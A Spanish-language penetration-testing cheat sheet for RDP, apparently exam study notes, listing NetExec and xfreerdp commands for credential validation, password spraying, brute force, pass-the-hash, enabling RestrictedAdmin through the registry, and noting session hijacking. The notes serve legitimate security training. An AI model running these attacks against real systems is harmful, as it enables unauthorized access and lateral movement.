# RDP (3389 / 3333)

Tags: #RDP #Windows #DC #RemoteDesktop #LateralMovement #PassTheHash

## OBJETIVO

- Validar si un usuario tiene acceso RDP
- Conectarse remotamente con credenciales, hash o ticket
- Identificar usuarios con sesiones activas
- Aprovechar configuraciones débiles (RestrictedAdmin, BlueKeep)

## TIPS

1. **RDP requiere que el usuario esté en el grupo 'Remote Desktop Users' o sea admin**
2. **Pass-the-Hash en RDP → solo funciona si RestrictedAdmin Mode está habilitado**
3. **Siempre valida con nxc antes de conectar → evitas certificados y timeouts innecesarios**
4. **Puerto por defecto 3389 → si no responde, probar 3333 y otros puertos no estándar**
5. **xfreerdp es más flexible que Remmina → úsalo para scripting y parámetros avanzados**
6. **Si encuentras sesiones activas de otros usuarios → oportunidad de secuestro de sesión**

## TOOLS

- [xfreerdp](https://github.com/FreeRDP/FreeRDP)
- [Remmina](https://remmina.org/)
- [NetExec](https://github.com/Pennyw0rth/NetExec)

## 1. VALIDACIÓN DE ACCESO (ANTES DE CONECTAR)

```bash
❯ nxc rdp <IP> -u 'user' -p 'pass'
# Requiere creds válidas → valida si el usuario tiene acceso RDP
# [+] → creds válidas
# [Pwn3d!] → acceso RDP confirmado

❯ nxc rdp <IP> -u 'user' -H 'NThash'
# Requiere hash NT → valida acceso por Pass-the-Hash
# Solo funciona si RestrictedAdmin Mode está habilitado en el target

❯ nxc rdp <IP> -u users.txt -p 'Password123'
# Password spraying → probar una contraseña contra múltiples usuarios
# Cuidado con lockout policy

❯ nxc rdp <IP> -u users.txt -p passwords.txt --continue-on-success
# Fuerza bruta → continúa aunque encuentre válidas
# Cuidado con lockout policy
```

### Insight

- Validar con nxc antes → evita abrir sesiones gráficas innecesarias
- [Pwn3d!] en RDP pero no en SMB → usuario es solo Remote Desktop User, no admin local

## 2. CONEXIÓN BÁSICA CON XFREERDP

```bash
❯ xfreerdp3 /v:<IP> /u:'user' /p:'passwd'
# Versión 3 de xfreerdp → mejor compatibilidad con sistemas modernos

❯ xfreerdp /v:<IP> /u:'user' /p:'passwd'
# Requiere creds válidas + grupo Remote Desktop Users o admin
# Puerto por defecto: 3389
# Presionar Y para aceptar el certificado al conectar

❯ xfreerdp /v:<IP>:3333 /u:'user' /p:'passwd'
# Puerto no estándar → especificar después de la IP con :puerto

❯ xfreerdp /v:<IP> /u:'user' /p:'passwd' \
  +clipboard /dynamic-resolution +window-drag -wallpaper
# Conexión mejorada:
# +clipboard         → habilitar portapapeles compartido
# /dynamic-resolution → ajustar resolución automáticamente
# +window-drag       → ver ventanas al arrastrar
# -wallpaper         → deshabilitar fondo de pantalla (más rápido)
```

## 3. PASS-THE-HASH EN RDP

```bash
# Requiere: RestrictedAdmin Mode habilitado en el target
# Verificar si está habilitado:
# HKLM\System\CurrentControlSet\Control\Lsa → DisableRestrictedAdmin = 0

❯ xfreerdp /v:<IP> /u:'Administrator' /pth:'NThash'
# Pass-the-Hash directo con xfreerdp
# No necesitas la contraseña en claro
# Solo funciona con RestrictedAdmin Mode activo

❯ xfreerdp /v:<IP> /u:'Administrator' /pth:'NThash' /d:'domain.corp'
# Especificar dominio → útil en entornos AD
```

### Insight

- Si PTH falla → RestrictedAdmin probablemente deshabilitado
- Puedes habilitarlo si tienes acceso previo: `reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0`

---

## 4. CONEXIÓN CON DOMINIO

```bash
❯ xfreerdp /v:<IP> /u:'user' /p:'passwd' /d:'domain.corp'
# Autenticación de dominio → cuando el usuario es de AD, no local

❯ xfreerdp /v:<IP> /u:'DOMAIN\user' /p:'passwd'
# Alternativa → especificar dominio en el usuario directamente
```

---

## 5. ENUMERACIÓN CON ACCESO RDP

```bash
❯ nxc rdp <IP> -u 'user' -p 'pass' --screenshot
# Requiere acceso RDP → captura screenshot del escritorio activo
# Útil para ver qué hay en la sesión sin conectarte completamente

❯ nxc rdp <IP> -u 'user' -p 'pass' --nla
# Verifica si NLA (Network Level Authentication) está habilitado
# NLA habilitado → requiere autenticación antes de mostrar pantalla de login
# NLA deshabilitado → posible vector para ataques sin creds completas
```

---

## 6. CONEXIÓN CON REMMINA (GRÁFICO)

```bash
❯ remmina
# Abre la interfaz gráfica de Remmina
	# → Ingresar IP del target
	# → Aceptar certificado
	# → Usuario y contraseña válidos
	# → Dominio: WORKGROUP (usuario local) o nombre del dominio (usuario AD)
	# → Conectar
```

### Insight

- Remmina → más cómodo para sesiones largas y trabajo visual
- xfreerdp → mejor para scripting, PTH y parámetros avanzados
- En el examen → xfreerdp es más rápido de usar desde terminal

## 7. OPCIONES ÚTILES DE XFREERDP

```bash
❯ xfreerdp /v:<IP> /u:'user' /p:'passwd' /drive:shares,/tmp/shares
# Montar carpeta local en la sesión RDP
# Útil para transferir herramientas sin usar SMB

❯ xfreerdp /v:<IP> /u:'user' /p:'passwd' /cert:ignore
# Ignorar errores de certificado → útil en labs con certs autofirmados

❯ xfreerdp /v:<IP> /u:'user' /p:'passwd' /size:1920x1080
# Especificar resolución de pantalla

❯ xfreerdp /v:<IP> /u:'user' /p:'passwd' /sec:rdp
# Forzar protocolo de seguridad RDP clásico
# Útil cuando TLS o NLA fallan
```

### Insight

- `/drive` → alternativa a SMB para mover archivos → muy útil si SMB está bloqueado
- `/cert:ignore` → en el examen los certs suelen ser autofirmados → úsalo si hay errores

## CONDICIONES CLAVE

- Usuario en Remote Desktop Users o admin → acceso RDP
- RestrictedAdmin Mode activo → Pass-the-Hash funciona
- NLA deshabilitado → superficie de ataque más amplia
- Creds de dominio → especificar /d o usar DOMAIN\user

## ONE-LINERS MENTALES

- Tengo creds → validar con nxc rdp antes de abrir sesión gráfica
- [Pwn3d!] → xfreerdp /v:IP /u:user /p:pass +clipboard /dynamic-resolution
- Tengo hash → xfreerdp con /pth → solo si RestrictedAdmin está activo
- Necesito mover archivos → /drive para montar carpeta local en la sesión
- Cert error → agregar /cert:ignore
